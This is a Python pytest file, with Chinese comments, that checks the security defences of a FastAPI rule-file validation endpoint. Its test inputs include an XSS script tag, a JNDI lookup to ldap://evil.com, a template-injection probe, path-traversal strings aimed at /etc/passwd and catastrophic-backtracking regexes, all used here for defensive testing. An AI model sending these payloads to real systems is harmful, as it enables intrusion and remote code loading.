import pytest
import tempfile
import os
from fastapi.testclient import TestClient
from fastapi import UploadFile
from io import BytesIO
import time

from backend.main import app
from backend.services.replace_service import ReplaceService

client = TestClient(app)


class TestReplaceValidationAPISecurity:
    """规则验证API安全性测试 - BE-03任务补充测试用例"""
    
    def create_test_file(self, content: str, filename: str = "test_rules.txt", content_type: str = "text/plain") -> tuple:
        """创建测试文件"""
        file_content = content.encode('utf-8')
        return (
            filename,
            BytesIO(file_content),
            content_type
        )
    
    def create_binary_file(self, content: bytes, filename: str = "test_rules.txt") -> tuple:
        """创建二进制测试文件"""
        return (
            filename,
            BytesIO(content),
            "application/octet-stream"
        )
    
    # 恶意文件上传防护测试
    def test_validate_rules_malicious_file_extension(self):
        """测试恶意文件扩展名防护"""
        malicious_extensions = [
            "malicious.exe",
            "script.js",
            "payload.php",
            "virus.bat",
            "trojan.scr"
        ]
        
        for filename in malicious_extensions:
            files = {"rules_file": self.create_test_file("test -> replacement", filename)}
            
            response = client.post("/api/v1/batch-replace/validate", files=files)
            
            # 应该拒绝非.txt文件
            assert response.status_code == 400
            response_data = response.json()
            assert "文件必须是.txt格式" in response_data.get("message", "")
    
    def test_validate_rules_file_size_limit(self):
        """测试文件大小限制"""
        # 创建超大文件（模拟50MB）
        large_content = "test_rule -> replacement\n" * 1000000  # 约50MB
        
        files = {"rules_file": self.create_test_file(large_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        # 应该有文件大小限制
        # 注意：实际的大小限制可能在FastAPI配置中设置
        assert response.status_code in [400, 413]  # 400 Bad Request 或 413 Payload Too Large
    
    def test_validate_rules_empty_filename(self):
        """测试空文件名处理"""
        files = {"rules_file": self.create_test_file("test -> replacement", "")}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        # 应该拒绝空文件名
        assert response.status_code == 422  # FastAPI返回422对于空文件名
        # 或者检查是否是400状态码
        if response.status_code == 400:
            response_data = response.json()
            assert "请求参数验证失败" in response_data.get("error", "")
    
    def test_validate_rules_binary_file_content(self):
        """测试二进制文件内容防护"""
        # 创建包含二进制数据的文件
        binary_content = b'\x00\x01\x02\x03\xFF\xFE\xFD\xFC' + b'test -> replacement'
        
        files = {"rules_file": self.create_binary_file(binary_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        # 应该能够处理或拒绝二进制内容
        assert response.status_code in [200, 400, 500]
        
        if response.status_code == 200:
            # 如果接受，应该有适当的警告
            data = response.json()
            assert "data" in data
        elif response.status_code == 500:
            # 如果拒绝，应该有错误信息
            data = response.json()
            assert "message" in data
            assert "规则文件验证失败" in data["message"]
    
    def test_validate_rules_malformed_utf8(self):
        """测试格式错误的UTF-8编码"""
        # 创建无效的UTF-8序列
        invalid_utf8 = b'\xFF\xFE' + "test -> replacement".encode('utf-8')
        
        files = {"rules_file": self.create_binary_file(invalid_utf8)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        # 应该能够处理编码错误
        assert response.status_code in [200, 400, 500]
        
        if response.status_code == 500:
            # 如果拒绝，应该有错误信息
            data = response.json()
            assert "message" in data
            assert "规则文件验证失败" in data["message"]
    
    # 恶意正则表达式防护API测试
    def test_validate_rules_api_redos_protection(self):
        """测试API层ReDoS攻击防护"""
        redos_content = """# ReDoS攻击测试
(a+)+b -> replacement | Catastrophic backtracking | regex
(x+x+)+y -> replacement | Another ReDoS pattern | regex
([a-zA-Z]+)*$ -> replacement | Nested quantifiers | regex
"""
        
        files = {"rules_file": self.create_test_file(redos_content)}
        
        start_time = time.time()
        response = client.post("/api/v1/batch-replace/validate", files=files)
        end_time = time.time()
        
        # API响应时间不应过长（5秒内）
        response_time = end_time - start_time
        assert response_time < 5, f"API response took too long: {response_time}s"
        
        # 应该检测到恶意正则表达式
        assert response.status_code == 200
        data = response.json()
        assert "data" in data
        
        validation_result = data["data"]
        assert validation_result["is_valid"] is False
    
    def test_validate_rules_api_timeout_protection(self):
        """测试API超时保护"""
        # 创建可能导致超时的复杂规则
        timeout_content = """# 超时测试
""" + "\n".join([f"(a{{1,100}}){{1,100}} -> replacement_{i} | Timeout test {i} | regex" for i in range(100)])
        
        files = {"rules_file": self.create_test_file(timeout_content)}
        
        start_time = time.time()
        response = client.post("/api/v1/batch-replace/validate", files=files)
        end_time = time.time()
        
        # API应该在合理时间内响应（10秒内）
        response_time = end_time - start_time
        assert response_time < 10, f"API timeout not working: {response_time}s"
        
        assert response.status_code in [200, 408, 500]  # 200 OK, 408 Timeout, 或 500 Internal Error
    
    # Unicode和编码安全测试
    def test_validate_rules_api_unicode_handling(self):
        """测试API Unicode字符处理"""
        unicode_content = """# Unicode测试
你好世界 -> Hello World | Chinese to English
🚀 -> rocket | Emoji replacement
\u200B -> \u0020 | Zero-width to space
é -> e | Accented character
"""
        
        files = {"rules_file": self.create_test_file(unicode_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        assert response.status_code == 200
        data = response.json()
        assert "data" in data
        
        # 应该能够正确处理Unicode字符
        validation_result = data["data"]
        assert "total_rules" in validation_result
        assert validation_result["total_rules"] > 0
    
    def test_validate_rules_api_bom_handling(self):
        """测试BOM（字节顺序标记）处理"""
        # 创建带BOM的UTF-8文件
        content_with_bom = "\ufeff# BOM测试\ntest -> replacement | BOM test"
        
        files = {"rules_file": self.create_test_file(content_with_bom)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        assert response.status_code == 200
        data = response.json()
        assert "data" in data
        
        # 应该正确处理BOM
        validation_result = data["data"]
        assert validation_result["total_rules"] >= 1
    
    # 注入攻击防护测试
    def test_validate_rules_api_script_injection(self):
        """测试脚本注入防护"""
        script_injection_content = """# 脚本注入测试
<script>alert('XSS')</script> -> safe_text | Script injection test
${jndi:ldap://evil.com/a} -> safe_text | JNDI injection test
{{7*7}} -> safe_text | Template injection test
"""
        
        files = {"rules_file": self.create_test_file(script_injection_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        assert response.status_code == 200
        data = response.json()
        
        # 响应不应包含未转义的脚本内容
        response_text = response.text
        assert "<script>" not in response_text
        assert "${jndi:" not in response_text
        assert "{{7*7}}" not in response_text or "49" not in response_text
    
    def test_validate_rules_api_path_traversal(self):
        """测试路径遍历攻击防护"""
        path_traversal_content = """# 路径遍历测试
../../../etc/passwd -> safe_text | Path traversal test
..\\..\\..\\windows\\system32 -> safe_text | Windows path traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2f -> safe_text | URL encoded traversal
"""
        
        files = {"rules_file": self.create_test_file(path_traversal_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        assert response.status_code == 200
        
        # 应该安全处理路径遍历字符
        data = response.json()
        assert "data" in data
    
    # 并发和资源耗尽测试
    def test_validate_rules_api_concurrent_requests(self):
        """测试并发请求处理"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def make_request():
            content = "test -> replacement | Concurrent test"
            files = {"rules_file": self.create_test_file(content)}
            
            try:
                response = client.post("/api/v1/batch-replace/validate", files=files)
                results.put((response.status_code, response.json()))
            except Exception as e:
                results.put((500, {"error": str(e)}))
        
        # 创建10个并发请求
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # 等待所有请求完成
        for thread in threads:
            thread.join(timeout=30)  # 30秒超时
        
        # 检查结果
        successful_requests = 0
        while not results.empty():
            status_code, response_data = results.get()
            if status_code == 200:
                successful_requests += 1
        
        # 至少应该有一些成功的请求
        assert successful_requests > 0
    
    def test_validate_rules_api_memory_exhaustion_protection(self):
        """测试内存耗尽保护"""
        # 创建可能导致内存问题的大量规则
        memory_intensive_rules = []
        for i in range(1000):
            large_pattern = "x" * 1000
            large_replacement = "y" * 1000
            memory_intensive_rules.append(f"{large_pattern}_{i} -> {large_replacement}_{i} | Memory test {i}")
        
        content = "\n".join(memory_intensive_rules)
        files = {"rules_file": self.create_test_file(content)}
        
        start_time = time.time()
        response = client.post("/api/v1/batch-replace/validate", files=files)
        end_time = time.time()
        
        # 应该在合理时间内响应
        response_time = end_time - start_time
        assert response_time < 30, f"Memory exhaustion protection failed: {response_time}s"
        
        # 应该返回有效响应
        assert response.status_code in [200, 400, 413, 500]
    
    # 错误处理和恢复测试
    def test_validate_rules_api_error_information_disclosure(self):
        """测试错误信息泄露防护"""
        # 创建可能导致内部错误的内容
        error_inducing_content = """# 错误诱导测试
\x00\x01\x02 -> replacement | Null bytes
\uFFFE\uFFFF -> replacement | Invalid Unicode
"""
        
        files = {"rules_file": self.create_test_file(error_inducing_content)}
        
        response = client.post("/api/v1/batch-replace/validate", files=files)
        
        # 错误响应不应泄露敏感信息
        response_text = response.text.lower()
        
        # 检查是否泄露了敏感路径或内部信息
        sensitive_patterns = [
            "/users/",
            "/home/",
            "c:\\",
            "traceback",
            "exception",
            "stack trace",
            "internal server error",
            "database",
            "sql"
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in response_text, f"Sensitive information disclosed: {pattern}"
    
    def test_validate_rules_api_rate_limiting(self):
        """测试API速率限制"""
        # 快速发送多个请求
        responses = []
        
        for i in range(20):  # 发送20个快速请求
            content = f"test_{i} -> replacement_{i} | Rate limit test {i}"
            files = {"rules_file": self.create_test_file(content)}
            
            response = client.post("/api/v1/batch-replace/validate", files=files)
            responses.append(response.status_code)
            
            if i > 10 and response.status_code == 429:  # Too Many Requests
                break
        
        # 如果实现了速率限制，应该看到429状态码
        # 如果没有实现，所有请求都应该成功
        assert all(code in [200, 400, 429] for code in responses)
    
    def test_validate_rules_api_content_type_validation(self):
        """测试Content-Type验证"""
        content = "test -> replacement | Content type test"
        
        # 测试不同的Content-Type
        invalid_content_types = [
            "application/json",
            "text/html",
            "application/xml",
            "image/png"
        ]
        
        for content_type in invalid_content_types:
            files = {"rules_file": self.create_test_file(content, content_type=content_type)}
            
            response = client.post("/api/v1/batch-replace/validate", files=files)
            
            # 应该接受文本文件或给出适当的错误
            assert response.status_code in [200, 400, 415]  # 415 Unsupported Media Type